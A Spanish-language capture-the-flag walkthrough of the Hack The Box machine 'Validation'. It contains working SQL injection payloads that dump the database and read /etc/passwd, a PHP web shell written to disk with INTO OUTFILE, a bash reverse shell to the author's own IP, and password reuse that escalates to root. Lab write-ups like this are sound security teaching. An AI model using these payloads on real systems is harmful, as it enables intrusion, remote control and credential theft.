---
title: Hack The Box Validation
author: k4miyo
date: 2022-04-12
math: true
mermaid: true
image:
  path: /assets/images/htb/hackthebox.png
categories: [Easy, Linux]
tags: [SQLi]
ping: true
---

## Validation
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.11.116.

```bash
❯ ping -c 1 10.10.11.116
PING 10.10.11.116 (10.10.11.116) 56(84) bytes of data.
64 bytes from 10.10.11.116: icmp_seq=1 ttl=63 time=139 ms

--- 10.10.11.116 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 139.123/139.123/139.123/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -T5 -v -n 10.10.11.116 -oG allPorts
Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-14 21:00 CDT
Initiating Ping Scan at 21:00                                   
Scanning 10.10.11.116 [4 ports]                                                                                                  
Completed Ping Scan at 21:00, 0.15s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 21:00
Scanning 10.10.11.116 [65535 ports]                                                                                              
Discovered open port 22/tcp on 10.10.11.116                                                                                      
Discovered open port 8080/tcp on 10.10.11.116
Discovered open port 80/tcp on 10.10.11.116
Discovered open port 4566/tcp on 10.10.11.116
Completed SYN Stealth Scan at 21:01, 49.60s elapsed (65535 total ports)
Nmap scan report for 10.10.11.116
Host is up (0.14s latency).
Not shown: 65522 closed tcp ports (reset), 9 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE                                                                                                           
22/tcp   open  ssh     
80/tcp   open  http                                                                                                              
4566/tcp open  kwtc            
8080/tcp open  http-proxy                                                                                                        
                                
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 50.28 seconds
           Raw packets sent: 80154 (3.527MB) | Rcvd: 79194 (3.168MB)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts                                         
───────┬──────────────────────────────────────
       │ File: extractPorts.tmp                                 
───────┼──────────────────────────────────────
   1   │                                                                                                                         
   2   │ [*] Extracting information...
   3   │                                                                                                                         
   4   │     [*] IP Address: 10.10.11.116
   5   │     [*] Open ports: 22,80,4566,8080
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sC -sV -p22,80,4566,8080 10.10.11.116 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-14 21:02 CDT
Nmap scan report for 10.10.11.116
Host is up (0.14s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)
|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)
|_  256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)
80/tcp   open  http    Apache httpd 2.4.48 ((Debian))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.48 (Debian)
4566/tcp open  http    nginx
|_http-title: 403 Forbidden
8080/tcp open  http    nginx
|_http-title: 502 Bad Gateway
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.44 seconds
```

Nos encontramos con varios puertos que tienen el servicio HTTP corriendo, así que antes de visualizar el contenido vía web, vamos a ver a lo que nos enfrentamos con la herramienta `whatweb`:

```bash
❯ whatweb http://10.10.11.116/
http://10.10.11.116/ [200 OK] Apache[2.4.48], Bootstrap, Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.48 (Debian)], IP[10.10.11.116], JQuery, PHP[7.4.23], Script, X-Powered-By[PHP/7.4.23]
❯ whatweb http://10.10.11.116:4566/
http://10.10.11.116:4566/ [403 Forbidden] Country[RESERVED][ZZ], HTTPServer[nginx], IP[10.10.11.116], Title[403 Forbidden], nginx
❯ whatweb http://10.10.11.116:8080/
http://10.10.11.116:8080/ [502 Bad Gateway] Country[RESERVED][ZZ], HTTPServer[nginx], IP[10.10.11.116], Title[502 Bad Gateway], nginx
```

Poco más podemos ver que lo que ya nos ha reportado `nmap`; por lo que vamos a ver vía web:

![""](/assets/images/htb-validation/validation-web.png)

Vemos que podemos ingresar un usuario, vamos a hacer algunas pruebas:

- `admin` - Vemos que se agrega al país que seleccionamos.
- `admin'` - Vemos que se agrega al país que seleccionamos con la *'*.
- `<h1>admin</h1>` - Es vulnerable a HTML Injection.
- `<script>admin</script>` - Es vulnerable a XSS.

No podemos hacer nada en este punto, así que vamos a ver como se tramita la petición y tenemos que se envían los campos **username** y **country**; por lo que vamos a interceptar la petición con **BurpSuite** y la mandamos al **Repeater**:

![""](/assets/images/htb-validation/validation-burp.png)

Agregamos una comilla simple al país y enviamos la petición.

![""](/assets/images/htb-validation/validation-burp1.png)

Al realizar las pruebas, para **Brazil** no se reflejaban las inyecciones que hacía; así que probé con otro país y ya comenzaron a reflejarse los cambios, para este caso **Mexico**. Ahora vamos a realizar las inyecciones siguientes:

- `username=k4miyo&country=Mexico' union select 1-- -` - Vemos que el campo del nombre de usuario cambia al valor 1.
- `username=k4miyo&country=Mexico' union select "test"-- -`: Vemos que el campo del nombre de usuario cambia al valor "test".
- `username=k4miyo&country=Mexico' union select database()-- -`: Vemos que el campo del nombre de usuario cambia al nombre de la base de datos, para este caso es **registration**.
- `username=k4miyo&country=Mexico' union select schema_name from information_schema.schemata-- -`: Tenemos los nombres de las bases de datos: **information_schema**, **performance_schema**, **mysql** y **registration**.
- `username=k4miyo&country=Mexico' union select table_name from information_schema.tables where table_schema="registration"-- -`: Vemos los nombres de las tablas presentes en la base de datos **registration**, en este caso **registration**.
- `username=k4miyo&country=Mexico' union select column_name from information_schema.columns where table_schema="registration" and table_name="registration"-- -` Obtenemos los nombres de las columnas de la tabla **registration**, las cuales son: **username**, **userhash**, **country** y **regtime**.
- `username=k4miyo&country=Mexico' union select group_concat(username,0x3a,userhash) from registration.registration-- -` Obtenemos los campos **username** y **userhash**.

A partir de aquí no tenemos nada interesante, pero podríamos tratar de ver recursos en la máquina y tratar de subir algún archivo:

- `username=k4miyo&country=Mexico' union select load_file("/etc/passwd")-- -` Podemos ver el `/etc/passwd` de la máquina víctima.
- `username=k4miyo&country=Afganistan' union select "<?php echo shell_exec($_REQUEST['cmd']); ?>" into outfile "/var/www/html/k4mishell.php" -- -` Podemos subir archivos en la ruta `/var/www/html` y en este caso un archivo php con la cual podemos ejecutar comandos a nivel de sistema.

![""](/assets/images/htb-validation/validation-web1.png)

Si tratamos de entablarnos una reverse shell, vemos que no nos funciona o que la conexión se muere rápidamente. Por lo tanto, trataremos de hacerlo con python; así que nos ponemos en escucha por el puerto 443:

```bash
❯ python3
Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> data = {'cmd' : "bash -c 'bash -i >& /dev/tcp/10.10.14.27/443 0>&1'"}
>>> import requests
>>> r = requests.post('http://10.10.11.116/k4mishell.php', data=data)
```

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.11.116] 43018
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@validation:/var/www/html$ whoami
whoami
www-data
www-data@validation:/var/www/html$ 
```

Ya ingresamos a la máquina como el usuario **www-data** y para trabajar más cómodos, vamos a hacer un [Tratamiento de la tty](/posts/tratamiento-tty). Vemos que podemos visualizar la primer flag (user.txt). Ahora vamos a enumerar un poco el sistema para ver de que forma podemos escalar privilegios:

```bash
www-data@validation:/home/htb$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@validation:/home/htb$ sudo -l
bash: sudo: command not found
www-data@validation:/home/htb$ cd /var/www/html/
www-data@validation:/var/www/html$ ls -l
total 40
-rw-r--r-- 1 www-data www-data  1550 Sep  2  2021 account.php
-rw-r--r-- 1 www-data www-data   191 Sep  2  2021 config.php
drwxr-xr-x 1 www-data www-data  4096 Sep  2  2021 css
-rw-r--r-- 1 www-data www-data 16833 Sep 16  2021 index.php
drwxr-xr-x 1 www-data www-data  4096 Sep 16  2021 js
-rw-r--r-- 1 mysql    mysql       65 Apr 11 18:37 k4mishell.php
www-data@validation:/var/www/html$ cat config.php 
<?php
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "uhc-9qual-global-pw";
  $dbname = "registration";

  $conn = new mysqli($servername, $username, $password, $dbname);
?>
www-data@validation:/var/www/html$
```

Tenemos una contraseña dentro del archivo `config.php`, suponiendo que se aplica reutilización de credenciales, podriamos ver si aplicar para el usuario **root**:

```bash
www-data@validation:/var/www/html$ su root
Password: 
root@validation:/var/www/html# whoami
root
root@validation:/var/www/html#
```

Ya somos el usuario **root** y podemos visualizar la flag (root.txt).

Se comparte un autopwn de la máquina [Validation-Autopwn](https://github.com/k4miyo/Validation-Autopwn).
